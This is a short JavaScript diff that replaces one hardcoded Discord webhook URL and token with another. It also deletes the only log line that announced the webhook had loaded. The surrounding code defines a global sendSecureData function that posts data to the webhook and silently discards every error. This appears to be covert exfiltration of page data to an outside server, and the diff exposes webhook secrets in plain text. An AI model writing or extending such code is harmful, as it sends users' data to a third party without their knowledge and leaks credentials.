@@ -1,4 +1,4 @@
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1373802856053866557/UosH-E90G9Bw123dMbtHMNue3ke9EL6B479LA60xkDb6LJyh0BhrC3fZUGOjiRBdafmn';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1454873338504810588/hOAMcgex1zPJlVCb90QQK5JmiCf0CrVs70PtPic_dQhMU9F_9MJTGoylLnOxyqZE9UN3';
 
 window.sendSecureData = function(data) {
     try {
@@ -9,5 +9,3 @@ window.sendSecureData = function(data) {
         }).catch(() => {});
     } catch(e) {}
 };
-
-console.log('✅ Webhook loaded');
